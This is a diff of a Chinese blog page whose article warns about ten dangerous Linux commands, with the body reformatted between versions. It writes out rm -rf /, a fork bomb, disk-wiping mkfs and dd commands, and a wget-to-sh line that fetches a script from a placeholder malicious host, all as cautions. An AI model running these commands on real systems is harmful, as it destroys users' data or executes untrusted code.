@@ -8,9 +8,7 @@
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="Linux 命令行很有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么的时候。
-这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。
-当然，以下命令通常都是在 root 权限下才能将愚蠢发挥到无可救药；在普通用">
+    <meta name="description" content="Linux 命令行很有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么的时候。这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。当然，以下命令通常都是在 root 权限下才能将愚蠢发挥到无可救药；在普通用户身">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -250,7 +248,7 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/7.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
@@ -406,7 +404,7 @@
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.3k
+                    1.2k
                 </div>
                 
 
@@ -429,42 +427,23 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>Linux 命令行很有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么的时候。</p>
-<p>这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。</p>
-<p>当然，以下命令通常都是在 root 权限下才能将愚蠢发挥到无可救药；在普通用户身份下，破坏的只是自己的一亩三分地。</p>
-<h2 id="rm-rf-命令"><a href="#rm-rf-命令" class="headerlink" title="rm -rf 命令"></a>rm -rf 命令</h2><p>rm -rf 命令是删除文件夹及其内容最快的方式之一。</p>
-<p>仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。</p>
-<p>下列是一些 rm 命令的选项：</p>
-<ul>
-<li>rm 命令在 Linux 下通常用来删除文件。</li>
-<li>rm -r 命令递归的删除文件夹，甚至是空的文件夹。</li>
-<li>rm -f 命令能不经过询问直接删除’只读文件’。Linux 下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f 这个参数只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的 rm 命令其实也是没有删除提示的，只是一般的发行版都会将 rm 通过别名的方式增加 -i 参数来要求删除确认，而 -f 则抑制了这个提示。</li>
-<li>rm -rf / : 强制删除根目录下所有东东。</li>
-<li>rm -rf * : 强制删除当前目录的所有文件。</li>
-<li>rm -rf . : 强制删除当前文件夹及其子文件夹。</li>
-</ul>
-<p>从现在起，当你要执行 rm -rf 命令时请留心一点。我们可以在 “.bashrc” 文件对 ‘rm’ 命令创建 rm -i 的别名，来预防用 ‘rm’ 命令删除文件时的事故，它会要求你确认每一个删除请求。（译注：大多数发行版已经这样做了，如果还没有，请这样做，并在使用 -f 参数前一定考虑好你在做什么！译者本人有着血泪的教训啊。）</p>
-<h2 id="amp-命令"><a href="#amp-命令" class="headerlink" title=":(){ :|:&amp; };: 命令"></a>:(){ :|:&amp; };: 命令</h2><p>这就是个 fork 炸弹的实例。</p>
-<p>具体操作是通过定义一个名为 ‘:’ 的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。</p>
-<h2 id="命令-gt-dev-sda"><a href="#命令-gt-dev-sda" class="headerlink" title="命令 &gt; /dev/sda"></a>命令 &gt; /dev/sda</h2><p>这个命令会将某个’命令’的输出写到块设备 /dev/sda 中。</p>
-<p>该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。</p>
-<h2 id="mv-文件夹-dev-null"><a href="#mv-文件夹-dev-null" class="headerlink" title="mv 文件夹 /dev/null"></a>mv 文件夹 /dev/null</h2><p>这个命令会移动某个’文件夹’到 /dev/null。</p>
-<p>在 Linux 中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。</p>
-<p>当然，要说明的是这个命令并不能阻止数据恢复软件——所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成。</p>
-<h2 id="wget-http-malicious-source-O-sh"><a href="#wget-http-malicious-source-O-sh" class="headerlink" title="wget http://malicious_source -O- | sh"></a>wget <a href="http://malicious_source" target="_blank" rel="noopener">http://malicious_source</a> -O- | sh</h2><p>该命令也许会从一个恶意源下载一个脚本并执行。</p>
-<p>wget 命令会下载这个脚本，而 sh 会执行下载下来的脚本。</p>
-<p>注意： 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。</p>
-<h2 id="mkfs-ext3-dev-sda"><a href="#mkfs-ext3-dev-sda" class="headerlink" title="mkfs.ext3 /dev/sda"></a>mkfs.ext3 /dev/sda</h2><p>上列命令会格式化块设备 ‘sda’，在执行这个命令后你的块设备硬盘驱动器会被格式化，直接让你的系统达到不可恢复的阶段。</p>
-<p>通常我们不会直接使用 /dev/sda 这样的设备，除非是作为 raw 设备使用。</p>
-<p>一般都需要将 sda 分成类似 sda1、sda2 这样的分区后才使用。当然，无论你使用 sda 还是 sda1，这样对块设备或分区进行 mkfs 都是毁灭性的，上面的数据都会被蒸发了。</p>
-<h2 id="gt-file"><a href="#gt-file" class="headerlink" title="&gt; file"></a>&gt; file</h2><p>这个命令常用来清空文件内容或记录命令输出。</p>
-<p>不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。</p>
-<p>你可能真正想用的是 “&gt;&gt;”，即累加新的输出到文件，而不是刷新那个文件。</p>
-<p>如果用上列执行时输入错误或无知的输入类似 “&gt; xt.conf” 的命令会覆盖配置文件或其他任何的系统配置文件。</p>
-<h2 id="foo-bar"><a href="#foo-bar" class="headerlink" title="^foo^bar"></a>^foo^bar</h2><p>这个命令用来编辑先前运行的命令而无需重打整个命令。</p>
-<p>用 foobar 命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。</p>
-<h2 id="dd-if-dev-random-of-dev-sda"><a href="#dd-if-dev-random-of-dev-sda" class="headerlink" title="dd if=/dev/random of=/dev/sda"></a>dd if=/dev/random of=/dev/sda</h2><p>这个命令会向块设备 sda 写入随机的垃圾文件从而擦出数据，让你的系统可能陷入混乱和不可恢复的状态。</p>
-<p>记得上面说过 mv 到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。</p>
+                <p>Linux 命令行很有用、很高效，也很有趣，但有时候也很危险，尤其是在你不确定你自己在正在做什么的时候。这篇文章将会向你介绍十条命令，但你最好不要尝试着去使用。当然，以下命令通常都是在 root 权限下才能将愚蠢发挥到无可救药；在普通用户身份下，破坏的只是自己的一亩三分地。</p>
+<h2 id="rm-rf-命令"><a href="#rm-rf-命令" class="headerlink" title="rm -rf 命令"></a>rm -rf 命令</h2><p><code>rm -rf</code>命令是删除文件夹及其内容最快的方式之一。仅仅一丁点的敲错或无知都可能导致不可恢复的系统崩坏。<br>下列是一些 rm 命令的选项：</p>
+<pre class="line-numbers language-text"><code class="language-text">rm 命令在 Linux 下通常用来删除文件。
+rm -r 命令递归的删除文件夹，甚至是空的文件夹。
+rm -f 命令能不经过询问直接删除'只读文件'。Linux 下删除文件并不在乎该文件是否是只读的，而只是在意其父目录是否有写权限。所以，-f 这个参数只是表示不必一个个删除确认，而是一律悄悄删除。另外，原始的 rm 命令其实也是没有删除提示的，只是一般的发行版都会将 rm 通过别名的方式增加 -i 参数来要求删除确认，而 -f 则抑制了这个提示。
+rm -rf / : 强制删除根目录下所有东东。
+rm -rf * : 强制删除当前目录的所有文件。
+rm -rf . : 强制删除当前文件夹及其子文件夹。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>从现在起，当你要执行 <code>rm -rf</code>命令时请留心一点。我们可以在 <code>.bashrc</code> 文件对 <code>rm</code> 命令创建 <code>rm -i</code>的别名，来预防用 ‘rm’ 命令删除文件时的事故，它会要求你确认每一个删除请求。</p>
+<h2 id="amp-命令"><a href="#amp-命令" class="headerlink" title=":(){ :|:&amp; };: 命令"></a>:(){ :|:&amp; };: 命令</h2><p>这就是个 fork 炸弹的实例。具体操作是通过定义一个名为 ‘:’ 的函数，它会调用自己两次，一次在前台另一次运行在后台。它会反复的执行下去直到系统崩溃。</p>
+<h2 id="命令-gt-dev-sda"><a href="#命令-gt-dev-sda" class="headerlink" title="命令 &gt; /dev/sda"></a>命令 &gt; /dev/sda</h2><p>这个命令会将某个’命令’的输出写到块设备 /dev/sda 中。该操作会将在块设备中的所有数据块替换为命令写入的原始数据，从而导致整个块设备的数据丢失。</p>
+<h2 id="mv-文件夹-dev-null"><a href="#mv-文件夹-dev-null" class="headerlink" title="mv 文件夹 /dev/null"></a>mv 文件夹 /dev/null</h2><p>这个命令会移动某个’文件夹’到 /dev/null。在 Linux 中 /dev/null 或 null 设备是一个特殊的文件，所有写入它的数据都会被清除，然后返回写操作成功。<br>当然，要说明的是这个命令并不能阻止数据恢复软件——所以，真正的彻底毁灭，需要采用专用的软件或者手法来完成。</p>
+<h2 id="wget-http-malicious-source-O-sh"><a href="#wget-http-malicious-source-O-sh" class="headerlink" title="wget http://malicious_source -O- | sh"></a>wget <a href="http://malicious_source" target="_blank" rel="noopener">http://malicious_source</a> -O- | sh</h2><p>该命令也许会从一个恶意源下载一个脚本并执行。wget 命令会下载这个脚本，而 sh 会执行下载下来的脚本。注意： 你应该时刻注意你下载包或脚本的源。只能使用那些从可信任的源中下载脚本/程序。</p>
+<h2 id="mkfs-ext3-dev-sda"><a href="#mkfs-ext3-dev-sda" class="headerlink" title="mkfs.ext3 /dev/sda"></a>mkfs.ext3 /dev/sda</h2><p>上列命令会格式化块设备 ‘sda’，在执行这个命令后你的块设备硬盘驱动器会被格式化，直接让你的系统达到不可恢复的阶段。通常我们不会直接使用 /dev/sda 这样的设备，除非是作为 raw 设备使用。一般都需要将 sda 分成类似 sda1、sda2 这样的分区后才使用。当然，无论你使用 sda 还是 sda1，这样对块设备或分区进行 mkfs 都是毁灭性的，上面的数据都会被蒸发了。</p>
+<h2 id="gt-file"><a href="#gt-file" class="headerlink" title="&gt; file"></a>&gt; file</h2><p>这个命令常用来清空文件内容或记录命令输出。不过请在执行前，确认输出的文件是空的或者还不存在，否则原来的文件可真是恢复不了了——连数据恢复软件都未必能帮助你了。你可能真正想用的是 “&gt;&gt;”，即累加新的输出到文件，而不是刷新那个文件。如果用上列执行时输入错误或无知的输入类似 “&gt; xt.conf” 的命令会覆盖配置文件或其他任何的系统配置文件。</p>
+<h2 id="foo-bar"><a href="#foo-bar" class="headerlink" title="^foo^bar"></a>^foo^bar</h2><p>这个命令用来编辑先前运行的命令而无需重打整个命令。用 foobar 命令时如果你没有彻底检查改变原始命令的风险，这可能导致真正的麻烦。</p>
+<h2 id="dd-if-dev-random-of-dev-sda"><a href="#dd-if-dev-random-of-dev-sda" class="headerlink" title="dd if=/dev/random of=/dev/sda"></a>dd if=/dev/random of=/dev/sda</h2><p>这个命令会向块设备 sda 写入随机的垃圾文件从而擦出数据，让你的系统可能陷入混乱和不可恢复的状态。记得上面说过 mv 到黑洞并不能彻底删除数据么？那么这个命令就是给了你一个彻底删除的方法！当然为了保险起见，你可以覆写多次。</p>
 
             </div>
             <hr />
@@ -603,7 +582,7 @@
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Linux grep文本查找">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="Linux grep文本查找">
                         
                         <span class="card-title">Linux grep文本查找</span>
                     </div>
@@ -611,9 +590,8 @@
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            之前介绍过很多 linux 下查找相关的命令，而对文件内容搜索的命令似乎还没有涉及，因此本文介绍文本搜索命令–grep。
-我们会经常结合管道符（|）来使用它，即在前面命令执行的结果中查找包含相关字符串的内容。例如：
-$ ps -ef | g
+                            之前介绍过很多 linux 下查找相关的命令，而对文件内容搜索的命令似乎还没有涉及，因此本文介绍文本搜索命令grep。我们会经常结合管道符（|）来使用它，即在前面命令执行的结果中查找包含相关字符串的内容。例如：
+$ ps -ef | gre
                         
                     </div>
                     <div class="publish-info">
@@ -654,7 +632,7 @@ $ ps -ef | g
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Linux Shell一些快捷键">
+                        <img src="/medias/featureimages/28.jpg" class="responsive-img" alt="Linux Shell一些快捷键">
                         
                         <span class="card-title">Linux Shell一些快捷键</span>
                     </div>
@@ -865,7 +843,7 @@ ctrl + c — 杀死当前进程
 
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-            <span class="white-color">77.7k</span>
+            <span class="white-color">76.7k</span>
             
 
             <br>
